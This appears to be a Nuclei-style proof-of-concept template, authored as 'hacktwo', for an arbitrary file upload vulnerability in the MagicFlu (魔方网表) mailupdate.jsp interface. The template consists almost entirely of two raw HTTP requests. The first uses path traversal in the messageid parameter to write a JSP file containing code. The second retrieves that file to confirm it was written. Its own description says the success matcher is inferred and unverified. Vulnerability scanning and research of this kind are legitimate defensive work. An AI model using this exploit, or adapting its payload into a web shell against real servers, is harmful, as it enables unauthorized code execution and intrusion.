id: poc-63dde21d764cd41ffb94
info:
  name: 魔方网表mailupdate接口存在任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
http:
- raw:
  - 'GET /magicflu/html/mail/mailupdate.jsp?messageid=/../../../test1.jsp&messagecontent=%3C%25+out.println%28%22tteesstt1%22%29%3B%25%3E HTTP/1.1

    User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)

    Accept-Encoding: gzip, deflate

    Accept: */*

    Connection: close

    Host: {{Hostname}}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /magicflu/test1.jsp HTTP/1.1

    User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)

    Accept-Encoding: gzip, deflate

    Accept: */*

    Connection: close

    Host: {{Hostname}}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
